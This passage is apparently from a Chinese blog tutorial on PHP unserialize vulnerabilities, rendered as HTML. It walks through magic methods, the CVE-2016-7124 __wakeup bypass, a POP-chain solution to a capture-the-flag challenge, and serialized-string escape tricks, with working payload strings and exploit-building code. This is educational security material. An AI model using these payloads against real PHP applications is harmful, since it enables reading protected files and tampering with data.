+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">class</span> <span class="nc">A</span>
+    <span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
+
+        <span class="p">}</span>
+        <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$funcion_name</span><span class="p">,</span><span class="nv">$arguments</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">echo</span><span class="s2">&#34;你调用的函数:&#34;</span><span class="o">.</span><span class="nv">$funcion_name</span><span class="o">.</span><span class="s2">&#34;(参数:&#34;</span><span class="p">;</span>
+            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$arguments</span><span class="p">);</span> <span class="c1">//数组要用print_r()
+</span><span class="c1"></span>            <span class="k">echo</span> <span class="s2">&#34;)不存在！&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+     <span class="p">}</span>
+
+     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span> 
+     <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">person</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;age&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span>
+     <span class="c1">//你调用的函数:person(参数:Array ( [0] =&gt; name [1] =&gt; age [2] =&gt; sex ) )不存在！
+</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><code>__get()</code></p>
+<ul>
+<li>访问private对象。</li>
+<li>访问不存在对象。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">Person</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;theoyu&#34;</span><span class="p">,</span> <span class="nv">$age</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="nv">$age</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;__get()&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$man</span><span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">age</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">sex</span><span class="p">;</span>
+<span class="cm">/*
+</span><span class="cm">1
+</span><span class="cm">__get()
+</span><span class="cm">__get()
+</span><span class="cm">*/</span>
+
+</code></pre></div><h2 id="反序列化漏洞">反序列化漏洞<a href="#反序列化漏洞" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="eg1">e.g.1<a href="#eg1" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<ul>
+<li><strong>CVE-2016-7124漏洞</strong>：当序列化字符串中表示<strong>对象属性个数的值</strong>大于<strong>真实的属性个数</strong>时会<strong>跳过</strong>__wakeup的执行。</li>
+<li>
+<blockquote>
+<p>要求版本:PHP5&lt;5.6.25   PHP7&lt;7.0.10</p>
+</blockquote>
+</li>
+<li>index.php:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">class</span> <span class="nc">loudong</span>
+    <span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
+        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="k">if</span><span class="p">(</span><span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="k">echo</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+                    <span class="nx">show_source</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">else</span>
+                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Wrong filename&#39;</span><span class="p">);</span>
+            <span class="p">}</span> 
+        <span class="p">}</span>
+        <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="s1">&#39;this is tostring&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+        
+
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+        <span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="cp">?&gt;</span><span class="err">  &lt;!-- key in flag.php --&gt;
+</span></code></pre></div><p>分析其中的几个函数<strong>strchr(&lsquo;a&rsquo;,&lsquo;b&rsquo;)</strong>:在a中搜索字串b，搜索成功返回剩下字串，失败return false。</p>
+<p><strong>代码审计</strong></p>
+<ol>
+<li>提示flag在flag.php里面，我们要想办法读到里面的内容。</li>
+<li>在析构函数中，<strong>show_source(dirname(<strong>FILE</strong>).'/'.$this-&gt;file)</strong>,<strong>dirname</strong>返回的是文件所在文件夹的绝对路径，拼接后面的 <strong>/$this-&gt;file</strong> ,想办法看能不能把file改为flag.php.</li>
+<li>在 <strong>__wakeup()</strong> 中，反系列化会自动调用把file置为index.php，那我们希望绕过这个函数。</li>
+</ol>
+<p><strong>这里需要用到CVE-2016-7124漏洞</strong></p>
+<blockquote>
+<p>当序列化字符串中表示对象属性个数大于真实的属性个数或值类型不匹配时会跳过__wakeup的执行.</p>
+</blockquote>
+<ul>
+<li>正常构造序列化对象:<code>O:7:&quot;loudong&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></li>
+<li>绕过:<code>O:7:&quot;loudong&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>//或i:8:&ldquo;flag.php都可</li>
+</ul>
+<h3 id="eg2">e.g.2<a href="#eg2" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>一道考察多方面的题</p>
+<div class="highlight"><pre class="chroma"><code class="language-PHP" data-lang="PHP"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">start_gg</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="o">-&gt;</span><span class="na">test1</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">Call</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">test1</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>    
+<span class="k">class</span> <span class="nc">funct</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$test2</span><span class="p">,</span><span class="nv">$arr</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="nv">$s1</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="p">;</span>
+                <span class="nv">$s1</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">func</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod2</span> <span class="o">=</span> <span class="s2">&#34;字符串拼接&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="p">;</span>
+        <span class="p">}</span> 
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">string1</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$str1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$str2</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str1</span><span class="o">-&gt;</span><span class="na">get_flag</span><span class="p">();</span>
+                <span class="k">return</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">GetFlag</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="nf">get_flag</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="k">include</span><span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;string&#39;</span><span class="p">];</span>
+<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><blockquote>
+<p>如何在一个类中实例化另一个类呢？利用类的构造函数，只要第一个类被实例化就会自动实例化我们需要另外构造的类。</p>
+</blockquote>
+<p><strong>思路</strong>：</p>
+<ol>
+<li>要想得到flag，需要调用GetFlag类中的get_flag()函数。</li>
+<li>在string1类可以看出，我们需要把str1实例化为GetFlag类的对象，然后看有没有字符串能调用__toString()函数。</li>
+<li>往上看，func类中，__invoke()函数存在字符串拼接，满足2的预期，需要把mod2实例化为string1的对象，再找找有没有把对象当作函数的地方来调用__invoke()。</li>
+<li>在funct类中找到调用$s1()函数，只需将mod1实例化为func类的对象，再找找有没有调用不存在函数的地方。</li>
+<li>芜湖,我们发现Call类中test1()函数就调用了不存在的函数，我们需要把mod1实例化为funct的对象。</li>
+<li>最后一步！往上看！在start__gg的析构函数就调用了test1()函数，那我们只需要把mod1实例化为__Call的对象就可以了！</li>
+</ol>
+<p>最后构造！</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">start_gg</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Call</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">Call</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">funct</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">funct</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">func</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">func</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">string1</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">string1</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$str1</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GetFlag</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">GetFlag</span> <span class="p">{}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">start_gg</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="c1">//O:8:&#34;start_gg&#34;:1:{s:4:&#34;mod1&#34;;O:4:&#34;Call&#34;:1:{s:4:&#34;mod1&#34;;O:5:&#34;funct&#34;:1:{s:4:&#34;mod1&#34;;O:4:&#34;func&#34;:1:{s:4:&#34;mod1&#34;;O:7:&#34;string1&#34;:1:{s:4:&#34;str1&#34;;O:7:&#34;GetFlag&#34;:0:{}}}}}}
+</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>payload serialize($a),得到flag。</p>
+<h2 id="拓展">拓展<a href="#拓展" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="字符串逃逸">字符串逃逸<a href="#字符串逃逸" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<blockquote>
+<p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>}</code> 作为结尾(字符串除外)，并且是根据长度判断内容。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-526902876.png" alt=""></p>
+<p>可以看到<code>}</code>以外的部分并没有反序列化。</p>
+<h4 id="函数使字符变多">函数使字符变多<a href="#函数使字符变多" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/t/i&#39;</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;ww&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;theoyu&#39;</span><span class="p">;</span>
+<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
+<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
+<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>在这个例子中，<code>filter</code>会把字符串中的t替换为两个w
+我们看看输出：
+<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2412547197.png" alt="">
+可以看到filter后，我们的username变成了<code>wwheoyu</code>，为7个字符，但filter是在序列化后，所以其6个字节的长度并没有更改，也就导致了反序列失败。</p>
+<p>这里我们假设一点，username是一个我们可以控制输入的变量，<code>$age=20</code>是一个不可更改的量，那我们就可以利用上面的filter函数来篡改age。</p>
+<p>username我们可以控制，那么通过闭合的思想，如果我们在username的末尾构造了<code>&quot;;i:1;i:18;}</code>,那么在反序列化时，真正的age部分就会因为在<code>}</code>以外而被忽略，默认username内我们构造的age为真，达到了篡改的目的。(有点像sql注入的闭合)</p>
+<p>我们已经知道了一点，filter函数的存在，username内每一个<code>t</code>将被替换为<code>ww</code>，就会导致长度+1,如果我们想构造username=<code>xxxx&quot;;i:1;i:18;}</code>,就需要把长度增加12位，那么我只需要构造username=<code>tttttttttttt&quot;;i:1;i:18;}</code>即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-1602856666.png" alt="">
+如果后面我们需要添加的内容不是前面每次增加字符的整数倍，可以在<code>}</code>外面随便加一些内容使长度为前面的倍数。</p>
+<h3 id="函数使字符变少">函数使字符变少<a href="#函数使字符变少" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/tt/i&#39;</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span> 
+<span class="p">}</span>
+<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;ttheoyu&#39;</span><span class="p">;</span>
+<span class="nv">$love</span> <span class="o">=</span> <span class="s1">&#39;game&#39;</span><span class="p">;</span>
+<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
+<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$love</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
+<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2167858145.png" alt="">
+字符减少的情况一般不止一个可修改的变量，这里我们加入<code>$love</code>变量，为什么要加入呢？与之前字符增加不一样，这里字符减少，只会把我们后面的一个变量的内容吞并，所以我要做的就是在username处构造适当的<code>tt</code>，把<code>$love</code>的关于长度部分给吞并掉，然后在<code>love</code>部分构造<code>;i:1;s:4:&quot;game&quot;;i:2;i:18;}</code>把前面被吞掉的部分补上，后面再伪造虚拟的<code>$age</code>,即可篡改。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="c1">#随便构造几个tt
+</span><span class="c1"></span><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/tt/i&#39;</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span> 
+<span class="p">}</span>
+<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;tttttttttttttttt&#39;</span><span class="p">;</span>
+<span class="nv">$love</span> <span class="o">=</span> <span class="s1">&#39;;i:1;s:4:&#34;game&#34;;i:2;i:18;}&#39;</span><span class="p">;</span>
+<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
+<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$love</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
+<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
+
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3288670259.png" alt="">
+我们数一下被应该被吞的部分 ，就是<code>&quot;;i:1;s:26:</code>,一共是11个字符，那么我们构造22个<code>t</code>即可。
+<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-510433908.png" alt=""></p>
+<h2 id="参考">参考<a href="#参考" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<ul>
+<li><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a></li>
+<li><a href="https://lethe.site/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x05-PHP-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://lethe.site/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x05-PHP-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></li>
+</ul>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg></p>
